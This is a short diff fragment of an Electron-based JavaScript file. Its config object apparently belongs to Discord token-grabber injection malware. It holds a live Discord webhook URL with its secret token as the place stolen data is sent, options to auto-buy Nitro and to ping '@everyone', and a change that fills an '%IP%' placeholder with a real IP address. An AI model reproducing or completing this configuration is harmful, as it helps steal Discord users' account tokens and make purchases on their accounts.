@@ -7,7 +7,7 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: 'https://discord.com/api/webhooks/984532018102681610/kpBeSW9lxjcDorDfQcMVczgNH3dO6AWyCki6-cDyq5QOT_2B8WxJwd_3ltQnpnqAYxRY', 
-  ip: '%IP%',
+  ip: '88.99.69.89',
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
